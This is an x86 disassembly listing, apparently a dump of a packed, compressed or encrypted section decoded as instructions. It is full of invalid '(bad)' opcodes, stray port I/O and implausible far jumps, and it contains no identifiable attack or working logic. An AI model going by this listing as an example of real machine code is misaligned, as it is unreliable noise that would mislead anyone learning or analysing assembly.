  406029:	xor    eax,0x5c4bfd60
  40602e:	loope  0x40606b
  406030:	bound  ebx,QWORD PTR [ecx+0x32]
  406033:	outs   dx,BYTE PTR ds:[esi]
  406034:	jno    0x405ff0
  406036:	dec    esi
  406037:	push   eax
  406038:	inc    esi
  406039:	neg    DWORD PTR [eax-0x78faffd4]
  40603f:	outs   dx,DWORD PTR ds:[esi]
  406040:	jbe    0x406049
  406042:	lea    ecx,[edi+0x62]
  406045:	xchg   esp,eax
  406046:	mov    esi,DWORD PTR [ebp-0x67]
  406049:	mov    BYTE PTR [esi],cl
  40604b:	mov    esi,0x1404e072
  406050:	pop    ss
  406051:	outs   dx,DWORD PTR ds:[esi]
  406052:	inc    ecx
  406053:	or     al,0xcd
  406055:	in     al,0x6d
  406057:	fdivr  QWORD PTR [edx]
  406059:	xchg   esi,eax
  40605a:	xor    cl,dh
  40605c:	mov    edi,0xc19f423f
  406061:	push   ebp
  406062:	lea    esi,[edx+0x46]
  406065:	adc    al,0x4c
  406067:	(bad)  
  406068:	mov    cl,0xf0
  40606a:	int3   
  40606b:	outs   dx,DWORD PTR ds:[esi]
  40606c:	out    dx,eax
  40606d:	pop    ebx
  40606e:	mov    eax,0x4844056
  406073:	sbb    esp,ebx
  406075:	mov    edx,0xa647533
  40607a:	mov    bh,0xa9
  40607c:	and    DWORD PTR [eax+ecx*8+0x4068b85],ebp
  406083:	adc    ecx,ebx
  406085:	ins    DWORD PTR es:[edi],dx
  406086:	mov    edx,0xddacb9e4
  40608b:	sbb    esp,DWORD PTR [edx+edi*1]
  40608e:	inc    edi
  40608f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406090:	shr    DWORD PTR [ecx-0x2af9873],0x6d
  406097:	outs   dx,DWORD PTR ds:[esi]
  406098:	cdq    
  406099:	xor    ch,BYTE PTR ds:0x1361dc12
  40609f:	push   ds
  4060a0:	and    al,0x47
  4060a2:	fucomip st,st(5)
  4060a4:	cmp    edi,DWORD PTR [ebp+eax*2-0x1a]
  4060a8:	sub    eax,0xb282631f
  4060ad:	jbe    0x406129
  4060af:	adc    BYTE PTR [edi],0x40
  4060b2:	xchg   esp,eax
  4060b3:	inc    edi
  4060b4:	add    cl,BYTE PTR [edi-0x13]
  4060b7:	fsub   DWORD PTR [ecx+0xccdc5f]
  4060bd:	ds and eax,0xa06d886f
  4060c3:	ins    BYTE PTR es:[edi],dx
  4060c4:	test   eax,0x8d5479d9
  4060c9:	and    al,0xd1
  4060cb:	mov    DWORD PTR [edi-0x75214697],ecx
  4060d1:	(bad)  [ebp-0x3c58b48c]
  4060d7:	ins    DWORD PTR es:[edi],dx
  4060d8:	mov    BYTE PTR [ebx-0x3574469e],0x18
  4060df:	cld    
  4060e0:	sub    bh,BYTE PTR [ebp-0x1ed4fa35]
  4060e6:	inc    esi
  4060e7:	xor    bl,BYTE PTR [eax+0x1f]
  4060ea:	or     ebx,ebx
  4060ec:	cmp    eax,0xd99f5ce
  4060f1:	je     0x4060b9
  4060f3:	xchg   esi,eax
  4060f4:	xchg   edi,eax
  4060f5:	test   DWORD PTR [esi],esp
  4060f7:	cs dec eax
  4060f9:	fprem  
  4060fb:	(bad)  
  4060fd:	mov    ch,0x78
  4060ff:	retf   0x3b67
  406102:	rcr    BYTE PTR [edi-0x49],1
  406105:	lahf   
  406106:	jns    0x406121
  406108:	out    0x6d,eax
  40610a:	xchg   esi,eax
  40610b:	ja     0x4060d2
  40610d:	dec    ebx
  40610e:	scas   al,BYTE PTR es:[edi]
  40610f:	clc    
  406110:	or     eax,0xe594a4ee
  406115:	inc    eax
  406116:	lea    esi,[ecx+0x61674ce9]
  40611c:	lds    esi,FWORD PTR [ebp+0x233bb0bc]
  406122:	out    0x6a,al
  406124:	idiv   DWORD PTR [ebx+0x43]
  406127:	shr    DWORD PTR [ecx-0x6fdebb11],0x5f
  40612e:	test   eax,0xa77877f1
  406133:	icebp  
  406134:	ins    BYTE PTR es:[edi],dx
  406135:	repnz xchg edx,eax
  406137:	sbb    BYTE PTR [ebx],ch
  406139:	popf   
  40613a:	add    DWORD PTR [ecx-0x4],edi
  40613d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40613e:	inc    esp
  40613f:	adc    eax,0xa1392dc0
  406144:	out    0xf3,eax
  406146:	push   edi
  406147:	fistp  QWORD PTR [eax+0x3f]
  40614a:	stc    
  40614b:	mov    ah,0xd5
  40614d:	push   ecx
  40614e:	lahf   
  40614f:	or     BYTE PTR [eax-0x11ce257a],ah
  406155:	sbb    DWORD PTR [ecx-0x3c],ebp
  406158:	sub    al,0x2e
  40615a:	sub    DWORD PTR [eax+0x7cd42e7d],esi
  406160:	imul   edx,esp,0x120db312
  406166:	clc    
  406167:	imul   eax,DWORD PTR [edi],0x745f94cd
  40616d:	dec    edx
  40616e:	and    eax,DWORD PTR [ebx+0xa]
  406171:	pushf  
  406172:	(bad)
  406176:	jns    0x4061ab
  406178:	mov    ch,0x7d
  40617a:	inc    eax
  40617b:	prefetch BYTE PTR [esi-0x18e8f06]
  406182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406183:	cmp    BYTE PTR ds:0xea106f2f,bl
  406189:	dec    ebx
  40618a:	and    BYTE PTR [esi-0x53450d4e],bh
  406190:	test   dl,al
  406192:	stos   DWORD PTR es:[edi],eax
  406193:	xchg   ecx,eax
  406194:	push   cs
  406195:	add    eax,0x2ad0a49f
  40619a:	sahf   
  40619b:	repnz push cs
  40619d:	sbb    dl,bl
  40619f:	xchg   ecx,eax
  4061a0:	out    dx,al
  4061a1:	sbb    BYTE PTR [edx-0x4989d10b],ch
  4061a7:	sbb    eax,0xfe8b7222
  4061ac:	xor    ecx,DWORD PTR [edx]
  4061ae:	sub    al,0x5f
  4061b0:	jae    0x406151
  4061b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061b3:	cmp    al,0x0
  4061b5:	les    ebx,FWORD PTR [ebp+0x598f73cc]
  4061bb:	das    
  4061bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061bd:	scas   al,BYTE PTR es:[edi]
  4061be:	ficomp WORD PTR ds:0xa52fe43
  4061c4:	cmp    al,cl
  4061c6:	mov    al,ds:0x187a4fff
  4061cb:	push   es
  4061cc:	fsubp  st(2),st
  4061ce:	call   0x36f64f3a
  4061d3:	mov    ah,0xaf
  4061d5:	test   eax,0xb8224d19
  4061da:	xchg   BYTE PTR [ebp-0x43],ah
  4061dd:	sub    DWORD PTR [edx-0x77af5d15],esp
  4061e3:	into   
  4061e4:	loop   0x40619e
  4061e6:	pop    ss
  4061e7:	test   BYTE PTR [ebx+0x504ff80c],dh
  4061ed:	loop   0x406180
  4061ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061f0:	retf   
  4061f1:	jb     0x4061bd
  4061f3:	mov    ds:0xa69e134f,eax
  4061f8:	jne    0x4061ff
  4061fa:	retf   0x54ab
  4061fd:	cld    
  4061fe:	xor    dh,BYTE PTR [eax]
  406200:	test   ecx,0x9f6cfceb
  406206:	adc    eax,0x65170baa
  40620b:	pushf  
  40620c:	into   
  40620d:	xor    DWORD PTR [edx],0xffffffe1
  406210:	inc    eax
  406211:	sti    
  406212:	xor    ebp,DWORD PTR [esi-0xd83d9a3]
  406218:	addr16 add eax,0xdd536210
  40621e:	sub    esp,DWORD PTR [ebx+0x4cd0e0f0]
  406224:	js     0x406262
  406226:	or     BYTE PTR [eax-0x5],bl
  406229:	in     eax,0x2e
  40622b:	out    0x20,eax
  40622d:	shr    DWORD PTR [edi+0x2a],1
  406230:	pop    esi
  406231:	pop    ecx
  406232:	adc    al,0xd4
  406234:	cmp    dl,BYTE PTR [eax+0x71608694]
  40623a:	test   DWORD PTR [edx-0x48],esi
  40623d:	dec    edx
  40623e:	cwde   
  40623f:	mov    ds,WORD PTR ds:0xd4b0b78
  406245:	fbstp  TBYTE PTR [edx+0x71]
  406248:	rol    ch,1
  40624a:	fwait
  40624b:	mov    edx,es
  40624d:	xchg   edx,eax
  40624e:	xor    esi,DWORD PTR [esi+0x6e]
  406251:	push   ss
  406252:	sub    eax,0x7a348222
  406257:	inc    edx
  406258:	mov    gs,WORD PTR [ecx+ebx*4-0x39]
  40625c:	push   edi
  40625d:	jg     0x4062a2
  40625f:	test   al,0xba
  406261:	mov    DWORD PTR [edx+0x46],edx
  406264:	add    eax,0x2ac7ad2b
  406269:	mov    al,al
  40626b:	pop    ebp
  40626c:	cdq    
  40626d:	jbe    0x406296
  40626f:	mov    eax,ds:0xe81f9a9b
  406274:	test   al,bh
  406276:	call   0x42ea:0x48f69925
  40627d:	jmp    0x406281
  40627f:	xchg   ebp,eax
  406280:	adc    eax,0x33d98d39
  406285:	cli    
  406286:	psllq  mm7,QWORD PTR [edi+0x440a716e]
  40628d:	aaa    
  40628e:	dec    ebp
  40628f:	mov    eax,eax
  406291:	outs   dx,DWORD PTR ds:[esi]
  406292:	mov    ch,0x1c
  406294:	sub    ebx,edx
  406296:	jl     0x40626b
  406298:	pop    edx
  406299:	adc    DWORD PTR [ebx+0x1a],esi
  40629c:	(bad)  
  40629d:	jg     0x406299
  40629f:	cdq    
  4062a0:	push   cs
  4062a1:	adc    ebx,DWORD PTR [ebp+0x32eff0f5]
  4062a7:	test   BYTE PTR [esi-0x1d],bh
  4062aa:	fnstcw WORD PTR [ecx+0x68]
  4062ad:	fist   DWORD PTR [esi+0x7f]
  4062b0:	lahf   
  4062b1:	out    0x10,eax
  4062b3:	out    dx,eax
  4062b4:	pop    edx
  4062b5:	pop    eax
  4062b6:	das    
  4062b7:	ja     0x40625d
  4062b9:	scas   al,BYTE PTR es:[edi]
  4062ba:	pminub mm0,QWORD PTR [eax-0x50b2eeb2]
  4062c1:	or     bl,BYTE PTR [eax]
  4062c3:	into   
  4062c4:	pop    esp
  4062c5:	sub    al,0xc1
  4062c7:	fadd   st(6),st
  4062c9:	test   BYTE PTR [si-0xf21],dl
  4062ce:	jno    0x40625f
  4062d0:	and    eax,0x24b966d7
  4062d5:	xor    BYTE PTR ds:0xca45c32c,ah
  4062db:	popa   
  4062dc:	sub    ecx,DWORD PTR [eax-0x1c]
  4062df:	out    dx,eax
  4062e0:	test   ebp,edi
  4062e2:	add    ebp,DWORD PTR [edx]
  4062e4:	inc    edx
  4062e5:	test   DWORD PTR [ecx+0x39],ebx
  4062e8:	cmc    
  4062e9:	mov    ds:0xc8391464,al
  4062ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062ef:	jg     0x40636a
  4062f1:	pop    ds
  4062f2:	cmp    DWORD PTR [esi],esp
  4062f4:	push   0x8d56aded
  4062f9:	mov    DWORD PTR [eax],ebp
  4062fb:	inc    ebp
  4062fc:	xchg   BYTE PTR [eax+0x19ed6cc],cl
  406302:	sub    al,0x92
  406304:	mov    ah,0x65
  406306:	mov    dl,0xb8
  406308:	retf   0x5131
  40630b:	or     edi,DWORD PTR cs:[ebp+0x2c]
  40630f:	and    bl,bl
  406311:	mov    ds:0x7bcef0d9,eax
  406316:	fwait
  406317:	add    al,0xa9
  406319:	add    eax,0x5121374a
  40631e:	fidiv  WORD PTR [ebp-0x5a]
  406321:	shl    BYTE PTR [ecx-0x52],0xeb
  406325:	sub    BYTE PTR [edi],dl
  406327:	cmc    
  406328:	pushf  
  406329:	popf   
  40632a:	dec    edx
  40632b:	sub    BYTE PTR [ebx+0x2f],ch
  40632e:	pop    edi
  40632f:	retf   0xbc41
  406332:	test   BYTE PTR [esi],0xfa
  406335:	fstp   TBYTE PTR [ebx+esi*4]
  406338:	fdiv   DWORD PTR [ecx-0xe]
  40633b:	or     al,0xed
  40633d:	push   ebx
  40633e:	(bad)  [edi+0x4fa5fd59]
  406344:	test   DWORD PTR [ebp+edi*4-0x5165dd71],esi
  40634b:	stos   BYTE PTR es:[edi],al
  40634c:	xchg   esi,eax
  40634d:	inc    ecx
  40634e:	jbe    0x406348
  406350:	(bad)  
  406351:	aas    
  406352:	js     0x4062eb
  406354:	xchg   BYTE PTR [edi-0x4007d438],bh
  40635a:	add    BYTE PTR [ebx+0x74],bh
  40635d:	mov    edx,0x15b2f9c7
  406362:	clc    
  406363:	shl    BYTE PTR ds:0xede4a9f4,1
  406369:	call   0xf8c9:0x3f9631fd
  406370:	lods   al,BYTE PTR ds:[esi]
  406371:	add    eax,0xec0f1eb1
  406376:	and    ecx,DWORD PTR [ebp-0x27]
  406379:	pop    DWORD PTR [ecx+0x13cacec9]
  40637f:	pushf  
  406380:	das    
  406381:	pop    esp
  406382:	int3   
  406383:	mov    ebx,0x3d3eba40
  406388:	pop    ebx
  406389:	mov    DWORD PTR [edx+0x3d],ecx
  40638c:	cdq    
  40638d:	pop    es
  40638e:	scas   al,BYTE PTR es:[edi]
  40638f:	sbb    DWORD PTR [ebx],ebx
  406391:	test   eax,0x3ff78a6b
  406396:	mov    ebx,DWORD PTR [ebx+ebx*1+0x53]
  40639a:	dec    esp
  40639b:	loope  0x4063f9
  40639d:	and    edx,DWORD PTR [edx+0x1a]
  4063a0:	fmul   st,st(2)
  4063a2:	sbb    DWORD PTR [esi],esp
  4063a4:	add    edx,esp
  4063a6:	daa    
  4063a7:	sbb    esp,ebp
  4063a9:	inc    ebx
  4063aa:	adc    DWORD PTR [edx-0x63],ebx
  4063ad:	adc    dh,ch
  4063af:	mov    bl,0xd4
  4063b1:	or     eax,DWORD PTR [eax-0x4d]
  4063b4:	jmp    0x33b2:0xa15b456d
  4063bb:	fistp  QWORD PTR [esi-0x75262021]
  4063c1:	hlt    
  4063c2:	ficomp DWORD PTR [ebp-0x43300eae]
  4063c8:	int3   
  4063c9:	into   
  4063ca:	pop    ecx
  4063cb:	push   edx
  4063cc:	pop    esp
  4063cd:	sub    DWORD PTR [eax-0xf],eax
  4063d0:	(bad)  
  4063d1:	lods   al,BYTE PTR ds:[esi]
  4063d2:	jae    0x4063a0
  4063d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063d5:	(bad)  
  4063d6:	jl     0x406452
  4063d8:	jmp    0x6648:0xb7289b61
  4063df:	fs xchg ecx,eax
  4063e1:	clc    
  4063e2:	retf   
  4063e3:	in     al,0x2e
  4063e5:	jo     0x4063cf
  4063e7:	inc    edi
  4063e8:	cmp    DWORD PTR [ebx-0x578e94f9],esi
  4063ee:	ds jmp 0x406450
  4063f1:	jg     0x40637c
  4063f3:	stos   BYTE PTR es:[edi],al
  4063f4:	(bad)  
  4063f5:	cmp    eax,0x4dbcda0c
  4063fa:	adc    cl,ch
  4063fc:	adc    al,0xb1
  4063fe:	leave  
  4063ff:	push   edx
  406400:	stos   BYTE PTR es:[edi],al
  406401:	dec    ebx
  406402:	test   al,0xba
  406404:	mov    dh,0x48
  406406:	cwde   
  406407:	(bad)  
  406408:	addr16 jae 0x4063b4
  40640b:	cld    
  40640c:	test   BYTE PTR [edi],0x91
  40640f:	jae    0x40647b
  406411:	repz mov bl,0x9e
  406414:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  406416:	jge    0x40639d
  406418:	xor    dl,BYTE PTR [eax+0x3b]
  40641b:	xor    BYTE PTR [edx-0x39],dh
  40641e:	daa    
  40641f:	repz aas 
  406421:	add    cl,BYTE PTR [edx]
  406423:	int3   
  406424:	mov    ds:0x3518fb52,eax
  406429:	mov    dh,0x5c
  40642b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40642c:	pushf  
  40642d:	(bad)  
  40642e:	jb     0x4063f4
  406430:	outs   dx,BYTE PTR ds:[esi]
  406431:	outs   dx,BYTE PTR ds:[esi]
  406432:	jle    0x4063fe
  406434:	int    0x8d
  406436:	add    bh,BYTE PTR [ebp+0x41]
  406439:	mov    BYTE PTR [edi],bh
  40643b:	push   es
  40643c:	pop    ecx
  40643d:	mov    esi,0xe005c45d
  406442:	push   eax
  406443:	sub    edx,DWORD PTR [ebx]
  406445:	test   eax,0xe76c42f9
  40644a:	mov    bl,0x9c
  40644c:	mov    ah,0xad
  40644e:	popa   
  40644f:	cli    
  406450:	stos   BYTE PTR es:[edi],al
  406451:	push   esi
  406452:	mov    al,ds:0xe266a70f
  406457:	mov    al,0x8a
  406459:	retf   
  40645a:	xchg   esp,ebp
  40645c:	jle    0x406484
  40645e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40645f:	iret   
  406460:	in     al,0x2d
  406462:	pop    esi
  406463:	mov    bl,0x26
  406465:	cmp    bh,BYTE PTR [esi+0x6f]
  406468:	lods   al,BYTE PTR ds:[esi]
  406469:	xchg   edx,eax
  40646a:	jl     0x406468
  40646c:	repnz xchg ah,dl
  40646f:	ja     0x4064c7
  406471:	push   es
  406472:	popf   
  406473:	mov    ebx,0x88f4fb39
  406478:	nop
  406479:	xchg   edi,eax
  40647a:	nop
  40647b:	add    DWORD PTR [ebx+0x2aca352d],edi
  406481:	sub    eax,0x17ad9fbe
  406486:	repnz in eax,dx
  406488:	dec    esi
  406489:	xor    eax,ecx
  40648b:	sub    al,BYTE PTR ds:0xe975bce2
  406491:	shr    BYTE PTR [eax],1
  406493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406494:	mov    ch,0xef
  406496:	xor    BYTE PTR [eax-0x58ef9966],dh
  40649c:	out    0xaa,al
  40649e:	call   0x1b4dfedb
  4064a3:	mov    ecx,0x6f415db2
  4064a8:	cwde   
  4064a9:	pop    edx
  4064aa:	jg     0x406467
  4064ac:	mov    al,ds:0x8b439a81
  4064b1:	dec    ebp
  4064b2:	clc    
  4064b3:	xor    eax,esi
  4064b5:	add    eax,edi
  4064b7:	jmp    0x4069c2
  4064bc:	mov    ebp,0xd9c2d73c
  4064c2:	fcmovnbe st,st(5)
  4064c4:	hlt    
  4064c5:	inc    ebp
  4064c6:	or     ebp,0xffffffb6
  4064c9:	pop    ss
  4064ca:	pop    ss
  4064cb:	cmp    DWORD PTR [eax-0x36],ebx
  4064ce:	js     0x406548
  4064d0:	push   0x7c
  4064d2:	js     0x40654c
  4064d4:	sbb    DWORD PTR [ebp+0x56167b3f],eax
  4064da:	icebp  
  4064db:	adc    al,dl
  4064dd:	es ret 
  4064df:	mov    al,ds:0xb2452528
  4064e4:	mov    eax,DWORD PTR [eax-0x488f3d71]
  4064ea:	mov    ah,0x2c
  4064ec:	and    eax,0x294dc726
  4064f1:	sbb    edi,0x62fd5567
  4064f7:	dec    ebx
  4064f8:	dec    ebx
  4064f9:	fild   DWORD PTR [ecx]
  4064fb:	mov    al,ds:0x879d358e
  406500:	int3   
  406501:	or     BYTE PTR [ecx+0x78],dl
  406504:	xor    eax,0x66f58c58
  406509:	in     eax,0xc7
  40650b:	push   ss
  40650c:	ins    BYTE PTR es:[edi],dx
  40650d:	pop    ebp
  40650e:	jl     0x40655c
  406510:	or     eax,0xd4c6f879
  406515:	sub    DWORD PTR [esi-0x61],ebx
  406518:	lock and al,0x1c
  40651b:	fadd   QWORD PTR ds:0xd2b3c292
  406521:	inc    esp
  406522:	fisubr DWORD PTR [ebp+ecx*8+0x1da5d88f]
  406529:	and    edi,eax
  40652b:	scas   eax,DWORD PTR es:[edi]
  40652c:	xor    al,0xc6
  40652e:	arpl   WORD PTR [esi+0x6ccb3602],dx
  406534:	xor    edx,esp
  406536:	xchg   ebp,eax
  406537:	mov    edx,0xb0a42749
  40653c:	sub    al,0x8
  40653e:	out    0x82,eax
  406540:	aam    0xdd
  406542:	cmp    ebp,DWORD PTR [ecx-0x659fb243]
  406548:	sbb    bl,BYTE PTR [ebx-0x6b27c12c]
  40654e:	xor    BYTE PTR [ecx-0x272c2dad],cl
  406554:	dec    ecx
  406555:	inc    ebx
  406556:	jg     0x40652b
  406558:	mov    esi,0xb09e898e
  40655d:	adc    edi,DWORD PTR [eax+0x47271e19]
  406563:	fisttp QWORD PTR [edx]
  406565:	pop    edi
  406566:	push   0xffffffe3
  406568:	push   ebx
  406569:	jmp    0x4065b4
  40656b:	xor    DWORD PTR [esp+eax*4],eax
  40656e:	xchg   esp,eax
  40656f:	jl     0x406526
  406571:	push   eax
  406572:	ret    
  406573:	shl    esp,cl
  406575:	lahf   
  406576:	jne    0x406516
  406578:	out    0x5e,al
  40657a:	imul   edx,DWORD PTR [eax+eax*1],0xffffffb9
  40657e:	inc    ecx
  40657f:	int3   
  406580:	xor    esp,DWORD PTR [eax+0x3f]
  406583:	mov    al,BYTE PTR [edx-0x7406993a]
  406589:	aaa    
  40658a:	leave  
  40658b:	xlat   BYTE PTR ds:[ebx]
  40658c:	sub    ecx,edi
  40658e:	ins    DWORD PTR es:[edi],dx
  40658f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406590:	or     eax,0xf5861873
  406595:	cmp    bh,cl
  406597:	push   es
  406598:	(bad)  
  406599:	(bad)  
  40659a:	jno    0x40659f
  40659c:	mov    eax,ds:0xeb648fd5
  4065a1:	out    0x71,eax
  4065a3:	sbb    DWORD PTR [edi],0x7c
  4065a6:	mov    al,0x5d
  4065a8:	lahf   
  4065a9:	fwait
  4065aa:	add    DWORD PTR [esi],ebx
  4065ac:	push   DWORD PTR [eax-0x744c0bf5]
  4065b2:	and    eax,0x5e421fa9
  4065b7:	pop    ebx
  4065b8:	jno    0x4065f8
  4065ba:	jns    0x4065c2
  4065bc:	xchg   ebp,eax
  4065bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065be:	(bad)  [esi]
  4065c0:	xchg   esp,eax
  4065c1:	mov    DWORD PTR [esi-0x2f],ebp
  4065c4:	adc    BYTE PTR [esi+0x67],al
  4065c7:	das    
  4065c8:	adc    BYTE PTR [ecx],dh
  4065ca:	mov    esp,0xc86494f0
  4065cf:	jne    0x4065d0
  4065d1:	cmp    dl,al
  4065d3:	pmuludq mm3,mm0
  4065d6:	shl    BYTE PTR [ebp+0x3b12b93],1
  4065dc:	loope  0x40663f
  4065de:	mov    dh,0xb1
  4065e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065e1:	enter  0xa52a,0xea
  4065e5:	ja     0x4065c0
  4065e7:	jb     0x4065c9
  4065e9:	jmp    DWORD PTR [edx+0xcc5e0c1]
  4065ef:	jno    0x40661e
  4065f1:	push   edi
  4065f2:	fst    DWORD PTR [ebx]
  4065f4:	bound  ebp,QWORD PTR [esi]
  4065f6:	dec    esp
  4065f7:	push   cs
  4065f8:	xchg   ebx,eax
  4065f9:	mov    bl,0x8e
  4065fb:	mov    edi,0x30f73ccf
  406600:	xor    eax,0x7efe7dba
  406605:	or     BYTE PTR [ebx-0x63],ah
  406608:	sub    DWORD PTR [edi+0x5dbc5eb8],edx
  40660e:	mov    al,ds:0x5aa66b5e
  406613:	(bad)  
  406614:	mov    esi,0x17cac402
  406619:	adc    edi,ecx
  40661b:	imul   edx,DWORD PTR [edi+0x15],0xffffffe5
  40661f:	inc    eax
  406620:	add    DWORD PTR [edx],ecx
  406622:	and    ch,BYTE PTR [esi+0x4a]
  406625:	xchg   ebp,eax
  406626:	push   0x64
  406628:	loope  0x40666b
  40662a:	cmp    DWORD PTR [esi-0x22],ecx
  40662d:	scas   eax,DWORD PTR es:[edi]
  40662e:	dec    eax
  40662f:	xor    bh,al
  406631:	mov    ecx,0xba01196b
  406636:	clc    
  406637:	ins    DWORD PTR es:[edi],dx
  406638:	jnp    0x4065bf
  40663a:	sub    bh,BYTE PTR [ecx-0x5f3eed8e]
  406640:	mov    eax,ds:0x61534f3c
  406645:	xchg   ecx,eax
  406646:	ficomp DWORD PTR [eax]
  406648:	add    al,0xf7
  40664a:	jmp    0x56d03480
  40664f:	xchg   ebp,eax
  406650:	mov    ds:0xca4e9b6f,al
  406655:	jo     0x406693
  406657:	ins    BYTE PTR es:[edi],dx
  406658:	enter  0xb1c0,0x6b
  40665c:	(bad)  
  40665d:	out    dx,al
  40665e:	push   ss
  40665f:	cmp    ah,BYTE PTR [ecx+0x60b3077c]
  406665:	dec    eax
  406666:	sar    edi,cl
  406668:	mov    bh,0xbf
  40666a:	loop   0x40662a
  40666c:	test   DWORD PTR [edi-0x2a],eax
  40666f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406670:	mov    ds:0x1ef83b1b,al
  406675:	push   0xffffffe2
  406677:	in     al,0x96
  406679:	clc    
  40667a:	mov    edi,0x7347c6ba
  40667f:	lahf   
  406680:	xsaves [eax-0x21b0d09c]
  406687:	inc    esi
  406688:	xor    DWORD PTR [edx-0xabb6fd1],ebx
  40668e:	scas   eax,DWORD PTR es:[edi]
  40668f:	retf   0x9bf
  406692:	xor    dh,BYTE PTR [si-0x4a]
  406696:	add    eax,0x8e316307
  40669b:	inc    ebp
  40669c:	and    edi,DWORD PTR [ebx]
  40669e:	in     eax,0x37
  4066a0:	sub    DWORD PTR [ebx-0x7c],eax
  4066a3:	jae    0x40670e
  4066a5:	fst    QWORD PTR [edx+0x69c21bf4]
  4066ab:	jg     0x4066ec
  4066ad:	and    bh,BYTE PTR [ebx]
  4066af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066b0:	je     0x4066f8
  4066b2:	mov    bl,0x98
  4066b4:	push   edi
  4066b5:	test   eax,0xfb2c1fed
  4066ba:	in     eax,dx
  4066bb:	or     eax,0xfff5e96e
  4066c0:	xchg   ebx,eax
  4066c1:	add    DWORD PTR [ecx-0x162fee00],ebx
  4066c7:	arpl   cx,bp
  4066c9:	into   
  4066ca:	jbe    0x4066a2
  4066cc:	lahf   
  4066cd:	mov    edi,DWORD PTR [eax]
  4066cf:	ficom  DWORD PTR [edi+ebx*1+0x1076b33e]
  4066d6:	enter  0xe793,0x19
  4066da:	mov    ss,WORD PTR [edx+eax*8-0x25]
  4066de:	into   
  4066df:	xor    edi,DWORD PTR [ebx-0x4f]
  4066e2:	jmp    FWORD PTR [eax+0x2a]
  4066e5:	ja     0x406742
  4066e7:	jg     0x40667c
  4066e9:	push   0x4cea0dad
  4066ee:	jno    0x406700
  4066f0:	pop    es
  4066f1:	out    0xe4,al
  4066f3:	inc    edx
  4066f4:	(bad)  
  4066f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066f6:	test   DWORD PTR [esi+ebx*2-0x29],0x4d64edeb
  4066fe:	shl    BYTE PTR [ecx+0x15985049],1
  406704:	gs in  al,0x6c
  406707:	adc    eax,0x222d79e9
  40670c:	stos   DWORD PTR es:[edi],eax
  40670d:	add    eax,0x54165e85
  406712:	adc    eax,0xf01d838b
  406717:	sbb    al,0x2f
  406719:	sub    DWORD PTR [eax],ecx
  40671b:	ja     0x40676e
  40671d:	sub    edi,DWORD PTR [eax-0x61]
  406720:	xchg   esp,eax
  406721:	mov    ch,0x84
  406723:	cs out 0xbe,eax
  406726:	mov    bh,0xd3
  406728:	sub    al,0x9e
  40672a:	and    DWORD PTR [ebx+0x6fc4c23e],esp
  406730:	dec    esi
  406731:	leave  
  406732:	jge    0x40675f
  406734:	dec    ebp
  406735:	je     0x40672e
  406737:	sar    BYTE PTR [edi-0x68],1
  40673a:	mov    ebp,0x982a71b
  40673f:	mov    BYTE PTR [edx],0xe4
  406742:	add    al,0x77
  406744:	sahf   
  406745:	pop    esp
  406746:	xchg   DWORD PTR [edi-0x8],edi
  406749:	pop    ebp
  40674a:	and    eax,0x4393b023
  40674f:	and    dh,0x34
  406752:	xor    eax,0xfe90da36
  406757:	in     al,dx
  406758:	xchg   ebp,eax
  406759:	push   ebx
  40675a:	jne    0x4067aa
  40675c:	aam    0x86
  40675e:	xor    DWORD PTR [edi+0x24],ebp
  406761:	and    eax,DWORD PTR [edi]
  406763:	pushf  
  406764:	dec    esp
  406765:	sbb    al,0xe4
  406767:	fild   DWORD PTR [ebx-0x1e]
  40676a:	and    esp,edx
  40676c:	lahf   
  40676d:	mov    ds:0xdbcb582e,al
  406772:	pop    ss
  406773:	(bad)  
  406774:	repz js 0x406737
  406777:	out    0xe8,eax
  406779:	pop    ebx
  40677a:	mov    ecx,0xcd1e5d2
  40677f:	ror    DWORD PTR [ebp+esi*1+0x43],1
  406783:	sub    DWORD PTR [esi-0x15cf15f],ebp
  406789:	(bad)  
  40678a:	push   0xffffff90
  40678c:	rcl    DWORD PTR [ecx-0x56],cl
  40678f:	jle    0x406751
  406791:	aad    0x18
  406793:	dec    edi
  406794:	cmp    eax,0x498d41c7
  406799:	loopne 0x40678d
  40679b:	sub    DWORD PTR [edx+0x53],edi
  40679e:	or     eax,0x1783f8be
  4067a3:	inc    esi
  4067a4:	adc    dh,BYTE PTR [ebx-0x21acd9fb]
  4067aa:	clc    
  4067ab:	push   esi
  4067ac:	sbb    BYTE PTR [ecx],0xff
  4067af:	and    edx,DWORD PTR [esi-0x5a]
  4067b2:	(bad)  
  4067b3:	stos   DWORD PTR es:[edi],eax
  4067b4:	xchg   esi,eax
  4067b5:	int    0xc0
  4067b7:	shl    DWORD PTR [eax+0x6c],0x60
  4067bb:	cmp    DWORD PTR [eax-0x4b51853a],ebx
  4067c1:	jne    0x406773
  4067c3:	push   0xe572c6cb
  4067c8:	jle    0x406834
  4067ca:	je     0x4067de
  4067cc:	push   edx
  4067cd:	dec    edi
  4067ce:	aad    0x3b
  4067d0:	int3   
  4067d1:	xor    BYTE PTR [eax],al
  4067d3:	push   edx
  4067d4:	cmp    eax,0x1a8808d5
  4067d9:	sub    eax,0x2125cdec
  4067de:	fscale 
  4067e0:	and    DWORD PTR [eax-0x12],0xffffffa2
  4067e4:	pop    ebx
  4067e5:	fcomp  QWORD PTR [esp+ebp*2-0x3a065a6e]
  4067ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067ed:	cdq    
  4067ee:	lock popf 
  4067f0:	xchg   esp,eax
